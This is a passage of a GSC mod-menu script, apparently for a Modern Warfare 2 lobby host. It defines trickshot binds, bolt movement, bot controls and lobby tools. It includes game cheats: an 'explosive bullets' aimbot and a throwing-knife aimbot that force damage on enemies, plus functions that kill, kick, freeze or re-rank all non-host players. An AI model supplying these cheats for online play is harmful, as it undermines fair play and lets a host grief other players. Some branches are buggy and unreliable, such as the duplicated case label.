        self bindwait("shax", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_shax"])) {
            if (self.primaryWeapon == self GetCurrentWeapon()) {
                ammoShaX = self getWeaponAmmoClip(self.pers["shaxweapon"]);
                ammoReturnStock = self GetWeaponAmmoStock(self.PrimaryWeapon);
                ammoReturnClip = self getWeaponAmmoClip(self.PrimaryWeapon);
                self giveWeapon(self.pers["shaxweapon"]);
                self setweaponammoclip(self.pers["shaxweapon"], ammoShaX - 60);
                self SetSpawnWeapon(self.pers["shaxweapon"]);
                wait 0.1;
                self takeWeapon(self.PrimaryWeapon);
                wait 0.1;
                self giveWeapon(self.PrimaryWeapon, self.loadoutPrimaryCamo);
                self SetWeaponAmmoStock(self.PrimaryWeapon, ammoReturnStock);
                self SetWeaponAmmoClip(self.PrimaryWeapon, ammoReturnClip);
                wait(self.pers["shaxtime"]);
                self takeWeapon(self.pers["shaxweapon"]);
                self SwitchToWeapon(self.PrimaryWeapon);
            } else if (self.secondaryWeapon == self GetCurrentWeapon()) {
                ammoShaX = self getWeaponAmmoClip(self.pers["shaxweapon"]);
                ammoReturnStock = self GetWeaponAmmoStock(self.secondaryWeapon);
                ammoReturnClip = self getWeaponAmmoClip(self.secondaryWeapon);
                self giveWeapon(self.pers["shaxweapon"]);
                self setweaponammoclip(self.pers["shaxweapon"], ammoShaX - 60);
                self SetSpawnWeapon(self.pers["shaxweapon"]);
                wait 0.1;
                self takeWeapon(self.secondaryWeapon);
                wait 0.1;
                self giveWeapon(self.secondaryWeapon,
                    self.loadoutSecondaryCamo);
                self SetWeaponAmmoStock(self.secondaryWeapon, ammoReturnStock);
                self SetWeaponAmmoClip(self.secondaryWeapon, ammoReturnClip);
                wait(self.pers["shaxtime"]);
                self takeWeapon(self.pers["shaxweapon"]);
                self SwitchToWeapon(self.secondaryWeapon);
            }
        }
    }
}
AllCockback() {
    if (!isDefined(self.pers["bind_shax"])) {
        self IPrintLn("You must select a bind to use first");
        return;
    }
    if (self _hasPerk("specialty_fastreload")) {
        if (self.pers["shaxgun"] == 0) {
            self.pers["shaxgun"] = 1;
            self.pers["shaxweapon"] = "uzi_mp";
            self.pers["shaxtime"] = 1.5;
            self IPrintLn("ShaX Weapon: ^6Uzi");
        } else if (self.pers["shaxgun"] == 1) {
            self.pers["shaxgun"] = 2;
            self.pers["shaxweapon"] = "kriss_mp";
            self.pers["shaxtime"] = 1.1;
            self IPrintLn("ShaX Weapon: ^6Vector");
        } else if (self.pers["shaxgun"] == 2) {
            self.pers["shaxgun"] = 3;
            self.pers["shaxweapon"] = "ump45_mp";
            self.pers["shaxtime"] = 1.2;
            self IPrintLn("ShaX Weapon: ^6UMP45");
        } else if (self.pers["shaxgun"] == 3) {
            self.pers["shaxgun"] = 4;
            self.pers["shaxweapon"] = "tavor_mp";
            self.pers["shaxtime"] = 1.2;
            self IPrintLn("ShaX Weapon: ^6TAR-21");
        } else if (self.pers["shaxgun"] == 4) {
            self.pers["shaxgun"] = 5;
            self.pers["shaxweapon"] = "glock_mp";
            self.pers["shaxtime"] = 1.2;
            self IPrintLn("ShaX Weapon: ^6G18");
        } else if (self.pers["shaxgun"] == 5) {
            self.pers["shaxgun"] = 6;
            self.pers["shaxweapon"] = "aa12_mp";
            self.pers["shaxtime"] = 1.4;
            self IPrintLn("ShaX Weapon: ^6AA12");
        } else if (self.pers["shaxgun"] == 6) {
            self.pers["shaxgun"] = 0;
            self notify("StopCockbackSoH");
            self IPrintLn("ShaX Weapon: ^1Off");
        }
    } else {
        if (self.pers["shaxgun"] == 0) {
            self.pers["shaxgun"] = 1;
            self.pers["shaxweapon"] = "uzi_mp";
            self.pers["shaxtime"] = 2.9;
            self IPrintLn("ShaX Weapon: ^6Uzi");
        } else if (self.pers["shaxgun"] == 1) {
            self.pers["shaxgun"] = 2;
            self.pers["shaxweapon"] = "kriss_mp";
            self.pers["shaxtime"] = 2.2;
            self IPrintLn("ShaX Weapon: ^6Vector");
        } else if (self.pers["shaxgun"] == 2) {
            self.pers["shaxgun"] = 3;
            self.pers["shaxweapon"] = "ump45_mp";
            self.pers["shaxtime"] = 2.5;
            self IPrintLn("ShaX Weapon: ^6UMP45");
        } else if (self.pers["shaxgun"] == 3) {
            self.pers["shaxgun"] = 4;
            self.pers["shaxweapon"] = "tavor_mp";
            self.pers["shaxtime"] = 2.5;
            self IPrintLn("ShaX Weapon: ^6TAR-21");
        } else if (self.pers["shaxgun"] == 4) {
            self.pers["shaxgun"] = 5;
            self.pers["shaxweapon"] = "glock_mp";
            self.pers["shaxtime"] = 2.5;
            self IPrintLn("ShaX Weapon: ^6G18");
        } else if (self.pers["shaxgun"] == 5) {
            self.pers["shaxgun"] = 6;
            self.pers["shaxweapon"] = "aa12_mp";
            self.pers["shaxtime"] = 2.9;
            self IPrintLn("ShaX Weapon: ^6AA12");
        } else if (self.pers["shaxgun"] == 6) {
            self.pers["shaxgun"] = 0;
            self notify("StopCockbackMar");
            self IPrintLn("ShaX Weapon: ^1Off");
        }
    }
}
flashmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        flashbind(mod);
    } else {
        self IPrintLn("Flash Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_flash");
    }
}
flashbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Flash Bind: [{" + z + "}]");
    self thread flash(z);
}
flash(button) {
    self endon("end_flash");
    for (;;) {
        self bindwait("flash", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_flash"])) {
            self thread maps\mp\_flashgrenades::applyFlash(1, 1);
        }
    }
}
thirdeyemod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        thirdeyebind(mod);
    } else {
        self IPrintLn("Third-eye Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_thirdeye");
    }
}
thirdeyebind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Third-eye Bind: [{" + z + "}]");
    self thread thirdeye(z);
}
thirdeye(button) {
    self endon("end_thirdeye");
    for (;;) {
        self bindwait("thirdeye", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_thirdeye"])) {
            self thread maps\mp\_flashgrenades::applyflash(0, 0);
        }
    }
}
boltmod(mod) {
    self.pers["has_" + mod] =
        (isDefined(self.pers["has_" + mod]) ? undefined : true);
    if (isDefined(self.pers["has_" + mod])) {
        self colortoggle(self.pers["has_" + mod]);
        boltbind(mod);
    } else {
        self IPrintLn("Bolt Movement Bind: ^1Off");
        self colortoggle(self.pers["has_" + mod]);
        self notify("end_bolt");
    }
}
boltbind(mod) {
    self thread togglebind(mod);
    self waittill("button_selected");
    z = self.pers["bind_" + mod];
    self IPrintLn("Bolt Movement Bind: [{" + z + "}]");
    self thread bolt(z);
}
bolt(button) {
    self endon("end_bolt");
    for (;;) {
        self bindwait("bolt", button);
        if (!self.menu["isOpen"] && isDefined(self.pers["has_bolt"])) {
            if (getDvarInt("function_boltfix") == 1)
                setDvar("cg_nopredict", 1);
            scriptride = spawn("script_model", self.origin);
            scriptride enablelinkto();
            self playerlinkto(scriptride);
            scriptride moveto(self.pers["bpos"], getDvarInt("boltTime"));
            wait(getDvarInt("boltTime"));
            if (IsDefined(self.pers["bpos2"])) {
                scriptride = spawn("script_model", self.origin);
                scriptride enablelinkto();
                self playerlinkto(scriptride);
                scriptride moveto(self.pers["bpos2"], getDvarInt("bolttime"));
                wait(getDvarInt("bolttime"));
                if (IsDefined(self.pers["bpos3"])) {
                    scriptride = spawn("script_model", self.origin);
                    scriptride enablelinkto();
                    self playerlinkto(scriptride);
                    scriptride moveto(self.pers["bpos3"],
                        getDvarInt("bolttime"));
                    wait(getDvarInt("bolttime"));
                    self unlink();
                    setDvar("cg_nopredict", 0);
                } else {
                    self unlink();
                    setDvar("cg_nopredict", 0);
                }
            } else {
                self unlink();
                setDvar("cg_nopredict", 0);
            }
        }
    }
}
fixBolt() {
    if (getDvarInt("function_boltfix") == 1) {
        self IPrintLn("Fix Bolt ADS: ^1Off");
    } else {
        self IPrintLn("Fix Bolt ADS: ^6On");
    }
    toggledvar("function_boltfix");
}
savebolt() {
    if (!IsDefined(self.pers["bpos"])) {
        self.pers["bpos"] = self.origin;
        self colortoggle(self.pers["bpos"]);
        self IPrintLn("Bolt Position 1: ^6Set");
    } else {
        self.pers["bpos"] = undefined;
        self IPrintLn("Bolt Position 1: ^6Removed");
        self colortoggle(self.pers["bpos"]);
    }
}
savebolt2() {
    if (!IsDefined(self.pers["bpos2"])) {
        self.pers["bpos2"] = self.origin;
        self IPrintLn("Bolt Position 2: ^6Set");
        self colortoggle(self.pers["bpos2"]);
    } else {
        self.pers["bpos2"] = undefined;
        self IPrintLn("Bolt Position 2: ^6Removed");
        self colortoggle(self.pers["bpos2"]);
    }
}
savebolt3() {
    if (!IsDefined(self.pers["bpos3"])) {
        self.pers["bpos3"] = self.origin;
        self IPrintLn("Bolt Position 3: ^6Set");
        self colortoggle(self.pers["bpos3"]);
    } else {
        self.pers["bpos3"] = undefined;
        self IPrintLn("Bolt Position 3: ^6Removed");
        self colortoggle(self.pers["bpos3"]);
    }
}
callaimbots() {
    if (isDefined(self.pers["eb_range"])) {
        self notify("NewRange");
        range = self.pers["eb_range"];
        self thread bigBullets(range, 2147483600);
    }
}
bigBullets(range, dam) {
    self endon("disconnect");
    self endon("game_ended");
    self endon("NewRange");
    for (;;) {
        aimAt = undefined;
        self waittill("weapon_fired");
        forward = self getTagOrigin("j_hip_le");
        end = vectorScale(anglestoforward(self getPlayerAngles()), 1000000);
        ExpLocation = BulletTrace(forward, end, false, self)["position"];
        foreach(player in level.players) {
            if ((player == self) || (!isAlive(player)) ||
                (level.teamBased && self.pers["team"] == player.pers["team"]))
                continue;
            if (isDefined(aimAt)) {
                if (closer(ExpLocation, player getTagOrigin("pelvis"),
                        aimAt getTagOrigin("pelvis")))
                    aimAt = player;
            } else
                aimAt = player;
        }
        if (distance(aimAt.origin, ExpLocation) < range) {
            if (!isDefined(self.pers["eb_weapon"])) {
                weaponclass = getweaponclass(self getCurrentWeapon());
                if (weaponclass == "weapon_sniper" ||
                    self GetCurrentWeapon() == "fal_xmags_mp") {
                    x = randomInt(10);
                    if (x < 2) {
                        if (dam > 2) {
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                            if (!self isHost()) {}
                            if (isAlive(aimAt)) {
                                aimAt thread[[level.callbackPlayerDamage]](
                                    self, self, 21952324, 8, "MOD_RIFLE_BULLET",
                                    self getCurrentWeapon(), (0, 0, 0),
                                    (0, 0, 0), "j_head", 0, 0);
                            }
                        } else
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                    } else {
                        if (dam > 2) {
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                            if (!self isHost()) {}
                            if (isAlive(aimAt)) {
                                aimAt thread[[level.callbackPlayerDamage]](
                                    self, self, 21952324, 8, "MOD_RIFLE_BULLET",
                                    self getCurrentWeapon(), (0, 0, 0),
                                    (0, 0, 0), "pelvis", 0, 0);
                            }
                        } else
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                    }
                }
            } else if (isDefined(self.pers["eb_weapon"])) {
                if (self.pers["eb_weapon"] == self getCurrentWeapon()) {
                    x = randomInt(10);
                    if (x < 2) {
                        if (dam > 2) {
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                            if (!self isHost()) {}
                            if (isAlive(aimAt)) {
                                aimAt thread[[level.callbackPlayerDamage]](
                                    self, self, 21952324, 8, "MOD_RIFLE_BULLET",
                                    self getCurrentWeapon(), (0, 0, 0),
                                    (0, 0, 0), "j_head", 0, 0);
                            }
                        } else
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                    } else {
                        if (dam > 2) {
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                            if (!self isHost()) {}
                            if (isAlive(aimAt)) {
                                aimAt thread[[level.callbackPlayerDamage]](
                                    self, self, 21952324, 8, "MOD_RIFLE_BULLET",
                                    self getCurrentWeapon(), (0, 0, 0),
                                    (0, 0, 0), "pelvis", 0, 0);
                            }
                        } else
                            aimAt thread[[level.callbackPlayerDamage]](
                                self, self, 1, 8, "MOD_RIFLE_BULLET",
                                self getCurrentWeapon(), (0, 0, 0), (0, 0, 0),
                                "pelvis", 0, 0);
                    }
                }
            }
        }
        wait 0.05;
    }
}
eb() {
    if (!isDefined(self.pers["eb_range"])) {
        self notify("NewRange");
        self thread bigBullets(100, 2147483600);
        self.pers["eb_range"] = 100;
        self iPrintln("Explosive Bullets: ^6On");
        self colortoggle(self.pers["eb_range"]);
    } else {
        self notify("NewRange");
        self.pers["eb_range"] = undefined;
        self iPrintln("Explosive Bullets: ^1Off");
        self colortoggle(self.pers["eb_range"]);
    }
}
ebrange(range) {
    self notify("NewRange");
    if (self ishost()) {
        self.pers["eb_range"] = range;
        self thread bigBullets(range, 2147483600);
        self iPrintln("Explosive Radius: ^6" + range);
    } else if (range > 751) {
        self IPrintLn("Well too high, Get to fuck!");
    } else {
        self.pers["eb_range"] = range;
        self thread bigBullets(range, 2147483600);
        self iPrintln("Explosive Radius: ^6" + range);
    }
}
ebweapon() {
    if (!isDefined(self.pers["eb_weapon"])) {
        weapon = self GetCurrentWeapon();
        self.pers["eb_weapon"] = weapon;
        self iPrintln("Explosive Bullets will work with ^6" + weapon);
    } else {
        self.pers["eb_weapon"] = undefined;
        self iPrintln("Explosive Bullets will work with ^6All Snipers");
    }
}
ThrowableAimbot() {
    self.ThrowAimbot = (isDefined(self.ThrowAimbot) ? undefined : true);
    if (isDefined(self.ThrowAimbot)) {
        self thread ThrowingKnifeAimbot();
        self iPrintln("Throwing Knife Aimbot: ^6On");
        self colortoggle(self.ThrowAimbot);
    } else {
        self notify("End_ThrowingKnifeAimbot");
        self iPrintln("Throwing Knife Aimbot: ^1Off");
        self colortoggle(self.ThrowAimbot);
    }
}
stunbot() {
    self endon("disconnect");
    self endon("End_Stunbot");
    for (;;) {
        self waittill("grenade_fire", grenade, weapname);
        wait .40;
        if (weapname == "flash_grenade_mp" ||
            weapname == "concussion_grenade_mp") {
            target = self GetClosestEnemy();
            if (isDefined(target))
                grenade thread FollowClosestTargetFeet(target, self);
        }
        wait .025;
    }
}
ThrowingKnifeAimbot() {
    self endon("disconnect");
    self endon("End_ThrowingKnifeAimbot");
    for (;;) {
        self waittill("grenade_fire", grenade, weapname);
        wait .90;
        if (weapname == "throwingknife_mp") {
            target = self GetClosestEnemy();
            if (isDefined(target))
                grenade thread FollowClosestTarget(target, self);
        }
        wait .025;
    }
}
FollowClosestTargetFeet(target, player) {
    duration = CalcDistance(1000, self.origin, player.origin);
    self MoveToOriginOverTime(target.origin, 0.90 + duration, target);
}
FollowClosestTarget(target, player) {
    duration = CalcDistance(1000, self.origin, player.origin);
    self MoveToOriginOverTime(target.origin, duration, target);
    target thread[[level.callbackPlayerDamage]](
        self, player, target.health, 0, "MOD_GRENADE", "throwingknife_mp",
        (0, 0, 0), (0, 0, 0), "j_head", 0, 0);
}
MoveToOriginOverTime(origin, time, player) {
    self endon("killanimscript");
    offset = self.origin - origin;
    frames = int(time * 20);
    offsetreduction = vectorScale(offset, 1 / frames);
    for (a = 0; a < frames; a++) {
        offset -= offsetreduction;
        if (isDefined(player))
            self.origin = player.origin + offset;
        else
            self.origin += offset;
        wait .05;
    }
}
CalcDistance(speed, origin, moveto) {
    return distance(origin, moveto) / speed;
}
GetClosestEnemy() {
    foreach(player in level.players) {
        if (player == self || player IsHost() || !isAlive(player) ||
            level.teamBased && self.pers["team"] == player.pers["team"])
            continue;
        if (!isDefined(enemy))
            enemy = player;
        if (closer(self.origin, player.origin, enemy.origin))
            enemy = player;
    }
    return enemy;
}
PauseTimer() {
    if (self.pause == 0) {
        self.pause = 1;
        self thread maps\mp\gametypes\_gamelogic::pausetimer();
        self iPrintln("Timer: ^6Paused");
    } else if (self.pause == 1) {
        self.pause = 0;
        self thread maps\mp\gametypes\_gamelogic::resumetimer();
        self iPrintln("Timer: ^1Resumed");
    }
}
doRoundReset() {
    game["roundsWon"]["axis"] = 0;
    game["roundsWon"]["allies"] = 0;
    game["roundsPlayed"] = 0;
    game["teamScores"]["allies"] = 0;
    game["teamScores"]["axis"] = 0;
    maps\mp\gametypes\_gamescore::updateTeamScore("axis");
    maps\mp\gametypes\_gamescore::updateTeamScore("allies");
    self iPrintln("The rounds have been reset");
}
SuperJump() {
    level.SuperJump = (isDefined(level.SuperJump) ? undefined : true);
    if (!isDefined(level.SuperJump)) {
        self iPrintln("Super Jump: ^1Off");
        self colortoggle(level.SuperJump);
        level notify("ServerSuperJump_End");
    } else {
        self iPrintln("Super Jump: ^6On");
        self colortoggle(level.SuperJump);
        level endon("disconnect");
        level endon("ServerSuperJump_End");
        while (isDefined(level.SuperJump)) {
            foreach(player in level.players) {
                player notify("newJump");
                player thread WatchSuperJump();
            }
            wait .025;
        }
    }
}
WatchSuperJump() {
    self endon("disconnect");
    self endon("newJump");
    level endon("ServerSuperJump_End");
    self NotifyOnPlayerCommand("player_jump", "+gostand");
    if (self IsOnGround()) {
        self waittill("player_jump");
        self maps\mp\perks\_perks::givePerk("specialty_falldamage");
        self SetVelocity(self GetVelocity() + (0, 0, 1000));
    }
}
SuperSpeed() {
    level.SuperSpeed = (isDefined(level.SuperSpeed) ? undefined : true);
    if (!isDefined(level.SuperSpeed)) {
        self iPrintln("Super Speed: ^1Off");
        self colortoggle(level.SuperSpeed);
        foreach(player in level.players) player SetMoveSpeedScale(1);
    } else {
        self iPrintln("Super Speed: ^6On");
        self colortoggle(level.SuperSpeed);
        while (isDefined(level.SuperSpeed)) {
            foreach(player in level.players) player SetMoveSpeedScale(2);
            wait .1;
        }
    }
}
settimescale(value) {
    if (value == 1) {
        setSlowMotion(1, 1, 0);
        self iPrintln("Slow Motion: ^1Default");
        self thread defaulttimescale();
    } else {
        setSlowMotion(1, value, 0);
        self iPrintln("Slow Motion: ^6" + value);
        self thread defaulttimescale();
    }
}
nukeFakeExplosion() {
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        (level.nukeTimer - 3.3), maps\mp\killstreaks\_nuke::nukeSoundIncoming);
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        level.nukeTimer, maps\mp\killstreaks\_nuke::nukeSoundExplosion);
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        level.nukeTimer, maps\mp\killstreaks\_nuke::nukeSlowMo);
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        level.nukeTimer, maps\mp\killstreaks\_nuke::nukeEffects);
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        (level.nukeTimer + 0.25), maps\mp\killstreaks\_nuke::nukeVision);
    level thread maps\mp\killstreaks\_nuke::delaythread_nuke(
        (level.nukeTimer + 1.5), maps\mp\killstreaks\_nuke::nukeEarthquake);
    level thread maps\mp\killstreaks\_nuke::nukeAftermathEffect();
    wait 4;
    setSlowMotion(0.25, 1, 2.0);
}
AntiJoin() {
    level.AntiJoin = (isDefined(level.AntiJoin) ? undefined : true);
    if (!isDefined(level.AntiJoin)) {
        self iPrintln("Anti Join: ^1Off");
        self colortoggle(level.AntiJoin);
        SetDvar("g_password", "");
    } else {
        self iPrintln("Anti Join ^6On");
        self colortoggle(level.AntiJoin);
        SetDvar("g_password", "@CF4");
    }
}
AntiQuit() {
    self.pers["antiquit"] =
        (isDefined(self.pers["antiquit"]) ? undefined : true);
    if (!isDefined(self.pers["antiquit"]))
        self iPrintln("Anti Quit: ^1Off");
    else {
        self iPrintln("Anti Quit: ^6On");
        nopause();
    }
}
nopause() {
    while (isDefined(self.pers["antiquit"])) {
        foreach(player in level.players) {
            myTeam = player.pers["team"];
            if (myTeam == level.hostTeam && !isDefined(player.chosenTeam)) {
                player closeInGameMenu();
            }
        }
        waitframe();
    }
}
ServerSetLobbyTimer(input) {
    timeLeft = GetDvar("scr_" + level.gametype + "_timelimit");
    timeLeftProper = int(timeLeft);
    if (input == "add")
        setTime = timeLeftProper + 1;
    if (input == "sub")
        setTime = timeLeftProper - 1;
    SetDvar("scr_" + level.gametype + "_timelimit", setTime);
    time = setTime - getMinutesPassed();
    wait .05;
    if (input == "add")
        self iPrintln("^6Added 1 minute");
    else
        self iPrintln("^1Removed 1 minute");
}
ToggleFloaters() {
    level.Floaters = (isDefined(level.Floaters) ? undefined : true);
    if (!isDefined(level.Floaters)) {
        level notify("EndFloaters");
        self iPrintln("Floaters: ^1Off");
        self colortoggle(level.Floaters);
    } else {
        self iPrintln("Floaters: ^6On");
        self colortoggle(level.Floaters);
        level endon("EndFloaters");
        level waittill("game_ended");
        foreach(player in level.players) player thread InitFloat();
    }
}
InitFloat() {
    if (self IsOnGround())
        return;
    self endon("disconnect");
    level endon("EndFloaters");
    linker = Spawn("script_model", self.origin);
    self PlayerLinkTo(linker);
    wait .1;
    self FreezeControls(true);
    while (1) {
        if (!self IsOnGround())
            linker MoveTo(linker.origin - (0, 0, 5), .15);
        wait .15;
    }
}
toggleNoobtubes() {
    level.Noobtubes = (isDefined(level.Noobtubes) ? undefined : true);
    if (!isDefined(level.Noobtubes)) {
        self iPrintln("Noob Tubes: ^1Off");
        self colortoggle(level.Noobtubes);
    } else {
        self iPrintln("Noob Tubes: ^6On");
        self colortoggle(level.Noobtubes);
    }
}
removeDeathBarrier() {
    ents = getentarray();
    for (index = 0; index < ents.size; index++) {
        if (issubstr(ents[index].classname, "trigger_hurt"))
            ents[index].origin = (0, 0, 9999999);
    }
}
ServerRestart() {
    map_restart(false);
}
getCoords() {
    self iPrintln("Coordinates: ^6" + self getOrigin());
}
getAngles() {
    self iPrintln("Facing Angle: ^6" + self.angles);
}
getGUIDKid() {
    self iPrintln("Account GUID: ^6" + self.GUID);
}
getGUIDPlayer(player) {
    self iPrintln("Account GUID: ^6" + player.GUID);
}
getWeapName() {
    self iPrintln("Weapon Name: ^6" + self getCurrentWeapon());
}
getNextWeapName() {
    self iPrintln("Next Weapon Name: ^6" + self getNextWeapon());
}
botlocations() {
    level.nameMap = getDvar("mapname");
    switch (level.nameMap) {
        case "mp_afghan":
            self setOrigin((1301, 957, 139));
            break;
        case "mp_terminal":
            self setOrigin((1404, 3538, 112));
            break;
        case "mp_crash":
            self setOrigin((466, 491, 257));
            break;
        case "mp_derail":
            self setOrigin((995, 1378, 110));
            break;
        case "mp_estate":
            self setOrigin((-2386, 963, -222));
            break;
        case "mp_favela":
            self setOrigin((-492, 62, 146));
            break;
        case "mp_highrise":
            self setOrigin((-1589, 6210, 2976));
            break;
        case "mp_invasion":
            self setOrigin((-750, -2343, 356));
            break;
        case "mp_checkpoint":
            self setOrigin((-772, 1498, 143));
            break;
        case "mp_overgrown":
            self setOrigin((-495, -3679, -51));
            break;
        case "mp_storm":
            self setOrigin((2276, -1160, 59));
            break;
        case "mp_compact":
            self setOrigin((277, 1500, 1));
            break;
        case "mp_complex":
            self setOrigin((943, -4239, 880));
            break;
        case "mp_abandon":
            self setOrigin((1948, 263, 150));
            break;
        case "mp_fuel2":
            self setOrigin((1040, 649, 36));
            break;
        case "mp_strike":
            self setOrigin((-938, -191, 200));
            break;
        case "mp_quarry":
            self setOrigin((-5240.24, -1776.08, -196.366));
            break;
        case "mp_rundown":
            self setOrigin((707, -982, 171));
            break;
        case "mp_boneyard":
            self setOrigin((-18, 969, 8));
            break;
        case "mp_nightshift":
            self setOrigin((108, -189, 0));
            break;
        case "mp_subbase":
            self setOrigin((373, 1225, 32));
            break;
        case "mp_underpass":
            self setOrigin((1206, 508, 399));
            break;
    }
}
AddBot(num, team) {
    if (team == "enemy")
        team = self GetEnemyTeam();
    else
        team = self.pers["team"];
    bot = [];
    for (a = 0; a < num; a++) {
        bot[a] = AddTestClient();
        if (!isDefined(bot[a])) {
            wait 1;
            continue;
        }
        bot[a].pers["isBot"] = true;
        bot[a] thread botRename();
        bot[a] thread giveBotRank();
        bot[a] thread SpawnBot(team);
        wait .1;
    }
}
giveBotRank() {
    if (getdvar("prestige") < "1" && getdvar("experience") < "2516000") {
        self setplayerdata("prestige", randomint(11));
        self setplayerdata("experience", 2516000);
    }
}
GetEnemyTeam() {
    if (self.pers["team"] == "allies")
        team = "axis";
    else
        team = "allies";
    return team;
}
SpawnBot(team) {
    self endon("disconnect");
    while (!isDefined(self.pers["team"])) wait .025;
    self notify("menuresponse", game["menu_team"], team);
    wait .1;
    self notify("menuresponse", "changeclass", "class" + randomInt(4));
    self waittill("spawned_player");
}
BotOptions(a, print) {
    switch (a) {
        case 1:
            foreach(player in level.players)
            if (isDefined(player.pers["isBot"]))
                player Suicide();
            break;
        case 2:
            foreach(player in level.players)
            if (isDefined(player.pers["isBot"]))
                kick(player GetEntityNumber());
            break;
        case 3:
            SetDvar("testClients_doAttack", false);
            SetDvar("testClients_doReload", false);
            break;
        case 4:
            SetDvar("testClients_doAttack", true);
            SetDvar("testClients_doReload", true);
            break;
        case 5:
            foreach(player in level.players)
            if (isDefined(player.pers["isBot"]))
                player SetOrigin(self TraceBullet());
            break;
        case 6:
            foreach(player in level.players)
            if (isDefined(player.pers["isBot"])) {
                player.pers["botLoc"] = true;
                player.pers["botSavePos"] = player.origin;
                player.pers["botSaveAng"] = player.angles;
            }
            break;
        case 7:
            player.pers["botSavePos"] = undefined;
            player.pers["botSaveAng"] = undefined;
            break;
        case 8:
            foreach(player in level.players)
            if (isDefined(player.pers["isBot"]))
                player SetPlayerAngles(
                    VectorToAngles(self GetTagOrigin("j_head") -
                        player GetTagOrigin("j_head")));
            break;
        case 9:
            self endon("disconnect");
            while (1) {
                SetDvar("testClients_doMove", true);
                SetDvar("testClients_doAttack", true);
                SetDvar("testClients_doReload", true);
                wait 3;
                SetDvar("testClients_doMove", false);
                SetDvar("testClients_doAttack", false);
                SetDvar("testClients_doReload", false);
                wait 5;
            }
            break;
        default:
            break;
    }
    if (isDefined(print))
        self iPrintln(print);
}
AllPlayersThread(num, print) {
    if (!isDefined(num))
        return;
    foreach(player in level.players)
    if (!player isHost() && !player isDeveloper())
        player thread AllPlayerFunctions(num, self);
    if (isDefined(print))
        self iPrintln(print);
}
AllTeammatesThread(num, print) {
    if (!isDefined(num))
        return;
    foreach(player in level.players)
    if (player.pers["team"] == level.hostTeam)
        player thread AllTeammatesFunctions(num, self);
    if (isDefined(print))
        self iPrintln(print);
}
AllPlayerFunctions(num, player) {
    switch (num) {
        case 0:
            self Suicide();
            break;
        case 1:
            Kick(self GetEntityNumber());
            break;
        case 2:
            self FreezeControls(true);
            break;
        case 3:
            self FreezeControls(false);
            break;
        case 4:
            self SetOrigin(player TraceBullet());
            break;
        case 5:
            self AllChallenges(self);
            break;
        case 6:
            self SetPrestige(10, self);
            break;
        case 6:
            self RevivePlayer(self);
            break;
        default:
            break;
    }
}
AllTeammatesFunctions(num, player) {
    switch (num) {
        case 0:
            self RevivePlayer(self);
            break;
        default:
            break;
    }
}
